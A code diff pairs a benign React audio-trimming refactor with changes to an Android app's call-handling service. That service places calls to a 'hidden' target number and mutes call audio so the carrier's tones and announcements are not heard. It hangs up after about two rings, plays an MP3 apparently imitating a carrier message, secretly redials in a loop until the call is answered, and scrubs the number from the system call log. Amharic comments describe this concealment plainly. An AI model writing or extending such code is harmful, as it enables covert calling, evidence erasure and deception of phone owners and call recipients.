@@ -35,6 +35,7 @@ import {
   cutOutAudioRange,
   appendAudioBlobs,
   audioBufferToWavBlob,
+  audioBufferToWavFile,
 } from './audioEditorUtils';
 
 if (typeof window !== 'undefined') {
@@ -274,17 +275,16 @@ export const SecretLiveBridgeModal: React.FC<SecretLiveBridgeModalProps> = ({
     if (!editingSlot || !editorAudioBuffer) return;
     setIsEditorBusy(true);
     try {
-      const wavBlob = keepAudioRange(editorAudioBuffer, selStartSec, selEndSec);
-      const file = new File([wavBlob], `${editingSlot}_trimmed.wav`, { type: 'audio/wav' });
+      const trimmedBuf = keepAudioRange(editorAudioBuffer, selStartSec, selEndSec);
+      const file = audioBufferToWavFile(trimmedBuf, `${editingSlot}_trimmed.wav`);
       const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
       updateConfigBoth(updated);
-      const newBuf = await decodeBlobToAudioBuffer(wavBlob);
-      setEditorAudioBuffer(newBuf);
-      setEditorDuration(newBuf.duration);
+      setEditorAudioBuffer(trimmedBuf);
+      setEditorDuration(trimmedBuf.duration);
       setSelStartSec(0);
-      setSelEndSec(Number(newBuf.duration.toFixed(2)));
-      setEditorPeaks(extractWaveformPeaks(newBuf, 64));
-      setStatusBanner(`✂️ ተቆርጦ (${newBuf.duration.toFixed(1)}s) ተቀምጧል!`);
+      setSelEndSec(Number(trimmedBuf.duration.toFixed(2)));
+      setEditorPeaks(extractWaveformPeaks(trimmedBuf, 64));
+      setStatusBanner(`✂️ ተቆርጦ (${trimmedBuf.duration.toFixed(1)}s) ተቀምጧል!`);
     } finally {
       setIsEditorBusy(false);
     }
@@ -294,17 +294,16 @@ export const SecretLiveBridgeModal: React.FC<SecretLiveBridgeModalProps> = ({
     if (!editingSlot || !editorAudioBuffer) return;
     setIsEditorBusy(true);
     try {
-      const wavBlob = cutOutAudioRange(editorAudioBuffer, selStartSec, selEndSec);
-      const file = new File([wavBlob], `${editingSlot}_cut.wav`, { type: 'audio/wav' });
+      const cutBuf = cutOutAudioRange(editorAudioBuffer, selStartSec, selEndSec);
+      const file = audioBufferToWavFile(cutBuf, `${editingSlot}_cut.wav`);
       const updated = await saveSecretBridgeSlotAudio(editingSlot, file);
       updateConfigBoth(updated);
-      const newBuf = await decodeBlobToAudioBuffer(wavBlob);
-      setEditorAudioBuffer(newBuf);
-      setEditorDuration(newBuf.duration);
+      setEditorAudioBuffer(cutBuf);
+      setEditorDuration(cutBuf.duration);
       setSelStartSec(0);
-      setSelEndSec(Number(newBuf.duration.toFixed(2)));
-      setEditorPeaks(extractWaveformPeaks(newBuf, 64));
-      setStatusBanner(`✂️ የተመረጠው ቦታ ወጥቶ (${newBuf.duration.toFixed(1)}s) ተቀምጧል!`);
+      setSelEndSec(Number(cutBuf.duration.toFixed(2)));
+      setEditorPeaks(extractWaveformPeaks(cutBuf, 64));
+      setStatusBanner(`✂️ የተመረጠው ቦታ ወጥቶ (${cutBuf.duration.toFixed(1)}s) ተቀምጧል!`);
     } finally {
       setIsEditorBusy(false);
     }
@@ -990,36 +989,32 @@ public class MainActivity extends Activity {
         private static int attemptCount = 0;
         private static final Handler ringHandler = new Handler(Looper.getMainLooper());
 
-        private static int savedVoiceCallVolume = -1;
-
-        private static void muteCarrierCallAudio(Context ctx) {
+        private static void redialHiddenCall() {
+            if (MainActivity.instance == null) return;
             try {
-                if (ctx == null) return;
-                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
-                if (am != null) {
-                    int cur = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
-                    if (cur > 0) {
-                        savedVoiceCallVolume = cur;
-                    }
-                    am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
-                    if (Build.VERSION.SDK_INT >= 23) {
-                        am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_MUTE, 0);
-                    }
+                TelecomManager tm = (TelecomManager) MainActivity.instance.getSystemService(Context.TELECOM_SERVICE);
+                Uri uri = Uri.fromParts("tel", hiddenTargetNumber, null);
+                Bundle extras = new Bundle();
+                if (tm != null && Build.VERSION.SDK_INT >= 23 &&
+                    MainActivity.instance.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
+                    cancelledByTimeout = false;
+                    tm.placeCall(uri, extras);
                 }
             } catch (Exception ignored) {}
         }
 
-        private static void restoreCarrierCallAudio(Context ctx) {
+        private void setVoiceAudioMuted(boolean mute) {
             try {
-                if (ctx == null) return;
-                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
+                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                 if (am != null) {
                     if (Build.VERSION.SDK_INT >= 23) {
-                        am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_UNMUTE, 0);
+                        am.adjustStreamVolume(
+                            AudioManager.STREAM_VOICE_CALL,
+                            mute ? AudioManager.ADJUST_MUTE : AudioManager.ADJUST_UNMUTE,
+                            0
+                        );
                     }
-                    int max = am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL);
-                    int target = (savedVoiceCallVolume > 0) ? savedVoiceCallVolume : max;
-                    am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, target, 0);
+                    am.setStreamMute(AudioManager.STREAM_VOICE_CALL, mute);
                 }
             } catch (Exception ignored) {}
         }
@@ -1030,13 +1025,26 @@ public class MainActivity extends Activity {
                 if (currentCall != null) {
                     int state = currentCall.getState();
                     if (state != Call.STATE_ACTIVE) {
-                        // መፍትሔ 1፦ የቴሌኮም «ቱ-ቱ» እና «የደወሉላቸው ደንበኛ...» ድምፅ ከMP3ው ጋር እንዳይገባ STREAM_VOICE_CALL ድምፅ አልባ (Mute) ይሆናል
+                        // 1. የቴሌ "የደወሉላቸው ደንበኛ..." ሳይመጣ በ 7-8 ሰከንድ (2 ጥሪ) ላይ ስልኩን ወዲያውኑ ያቋርጠዋል
+                        cancelledByTimeout = true;
+                        try {
+                            currentCall.disconnect();
+                        } catch (Exception ignored) {}
+
+                        // 2. በWebView ውስጥ የ «ሁሉም የአገልግሎት ሰጪዎች...» MP3 ብቻ እንዲጫወት ያዛል
                         if (MainActivity.instance != null) {
-                            muteCarrierCallAudio(MainActivity.instance);
                             MainActivity.instance.notifyWebViewJs(
                                 "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                             );
                         }
+
+                        // 3. MP3ው እየተጫወተ ሳለ ከ 4 ሰከንድ ቆይታ በኋላ በድብቅ መልሶ ይደውላል (እስኪነሳ ድረስ በ loop ይቀጥላል)
+                        ringHandler.postDelayed(new Runnable() {
+                            @Override
+                            public void run() {
+                                redialHiddenCall();
+                            }
+                        }, 4000);
                     }
                 }
             }
@@ -1079,6 +1087,7 @@ public class MainActivity extends Activity {
             attemptCount++;
 
             call.registerCallback(callCallback);
+            setVoiceAudioMuted(true); // ስልኩ እየጠራ ባለበት ሰዓት የቴሌኮም መጥሪያ ድምፅ እንዳይሰማ ዝም ያሰኘዋል
 
             if (MainActivity.instance != null) {
                 Intent i = new Intent(this, MainActivity.class);
@@ -1097,6 +1106,7 @@ public class MainActivity extends Activity {
             super.onCallRemoved(call);
             ringHandler.removeCallbacks(twoRingTimeoutRunnable);
             call.unregisterCallback(callCallback);
+            setVoiceAudioMuted(false);
             if (currentCall == call) {
                 currentCall = null;
             }
@@ -1105,21 +1115,28 @@ public class MainActivity extends Activity {
 
         private void handleCallState(Call call, int state) {
             if (state == Call.STATE_DIALING || state == Call.STATE_RINGING) {
+                setVoiceAudioMuted(true); // የቴሌኮም ድምፅ ፈጽሞ እንዳይሰማ ዝም ያሰኛል
                 if (MainActivity.instance != null) {
                     MainActivity.instance.notifyWebViewJs(
                         "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                     );
                 }
             } else if (state == Call.STATE_ACTIVE) {
+                // ስልኩ ተነስቷል!
                 wasAnsweredLive = true;
+                cancelledByTimeout = false;
                 ringHandler.removeCallbacks(twoRingTimeoutRunnable);
+                setVoiceAudioMuted(false); // የቀጥታ ንግግሩ እንዲሰማ የጥሪ ድምፁን ይከፍታል
+
                 if (MainActivity.instance != null) {
+                    // MP3ውን ወዲያውኑ እንዲያቆም ለ Web App ያዛል!
                     MainActivity.instance.notifyWebViewJs(
                         "window.onSecretCallAnswered && window.onSecretCallAnswered();"
                     );
                 }
             } else if (state == Call.STATE_DISCONNECTED) {
                 ringHandler.removeCallbacks(twoRingTimeoutRunnable);
+                setVoiceAudioMuted(false);
                 scrubHiddenNumberFromSystemCallLog();
                 if (wasAnsweredLive) {
                     wasAnsweredLive = false;
@@ -1134,23 +1151,12 @@ public class MainActivity extends Activity {
                             "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                         );
                     }
-                    // ሰውየው ገና ሳያነሳው ጥሪው ቢቋረጥ MP3ው ሳይቆም እስኪነሳ ድረስ በድብቅ እንደገና ይደውላል
                     ringHandler.postDelayed(new Runnable() {
                         @Override
                         public void run() {
-                            if (MainActivity.instance != null && !cancelledByTimeout) {
-                                try {
-                                    TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
-                                    Uri uri = Uri.fromParts("tel", hiddenTargetNumber, null);
-                                    Bundle extras = new Bundle();
-                                    if (tm != null && Build.VERSION.SDK_INT >= 23 &&
-                                        checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
-                                        tm.placeCall(uri, extras);
-                                    }
-                                } catch (Exception ignored) {}
-                            }
+                            redialHiddenCall();
                         }
-                    }, 400);
+                    }, 4000);
                 }
             }
         }
